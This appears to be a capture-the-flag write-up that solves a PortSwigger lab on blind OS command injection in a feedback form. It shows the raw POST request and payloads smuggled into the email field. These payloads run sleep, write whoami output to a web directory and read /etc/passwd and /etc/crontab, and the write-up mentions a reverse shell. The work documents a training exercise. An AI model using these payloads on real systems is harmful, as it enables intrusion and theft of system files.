# 3. Blind OS command injection with output redirection

**Goal** : retrieve user from /var/www/images/ directory

**Steps** : 

- submit the feedback form, u will get an endpoint of /feedback/submit

```jsx
POST /feedback/submit HTTP/2
Host: 0a6400bf035e3e9c84bd6e31009400bc.web-security-academy.net
Cookie: session=QMOeO7xk3qbeOzZfr8hRcRAkC3PBbLrl
Content-Length: 132
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a6400bf035e3e9c84bd6e31009400bc.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a6400bf035e3e9c84bd6e31009400bc.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

csrf=j5YXRTxLsQpEdrMyuJ4bfiPPA22bLVSQ&name=hacker&email=hackkk%40gmail.com;sleep+5;&subject=Super&message=Now+u+have+been+hacked+bro
```

- send this in repeater, and check every parameter by input **;ls;**
- u can see only email parameter giving some unique response(res : could not save….)
- now add **;sleep 5;**  to check for delay in response.

```jsx
email=hackkk%40gmail.com;sleep+5;
```

- Now write the **whoami** command in a file(below).

— > payload like this : 

```jsx
;whoami>/var/www/images/file.txt;
```

- full line like :

```jsx
csrf=j5YXRTxLsQpEdrMyuJ4bfiPPA22bLVSQ&name=hacker&email=hackkk%40gmail.com;whoami>/var/www/images/file.txt;&subject=Super&message=Now+u+have+been+hacked+bro
```

- now open any image from website in a new tab.
- Nowwwww

```jsx
https://0a6400bf035e3e9c84bd6e31009400bc.web-security-academy.net/image?filename=file.txt
```

O/P → 

```jsx
peter-nU2qlv
```

LAB SOLVED.

### More payload u can use in this :

```jsx
;cat etc/crontab > file1.txt;
;cat etc/passwd > file1.txt;
;ls  > file1.txt;
```

## U can  also take rev shell if u are in same network of portswigger.